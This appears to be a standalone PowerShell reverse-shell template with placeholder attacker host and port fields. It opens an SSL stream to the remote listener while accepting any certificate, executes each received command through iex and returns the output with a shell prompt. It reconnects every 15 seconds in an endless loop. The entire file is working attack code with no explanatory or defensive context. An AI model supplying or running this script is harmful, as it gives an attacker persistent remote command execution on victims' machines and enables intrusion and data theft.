do {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient('*LHOST*', *lport*)
        $networkStream = $tcpClient.GetStream()
        $sslStream = New-Object System.Net.Security.SslStream($networkStream, $false, `
            { $true }, $null)

        $sslStream.AuthenticateAsClient('')

        [byte[]] $bytes = 0..65535 | ForEach-Object { 0 }

        while (($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex ". { $data } 2>&1" | Out-String)
            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $sslStream.Write($sendbyte, 0, $sendbyte.Length)
            $sslStream.Flush()
        }

        $sslStream.Close()
        $tcpClient.Close()
    } catch {
        Write-Output "Error occurred: $_"
    }

    Start-Sleep -Seconds 15
} while ($true)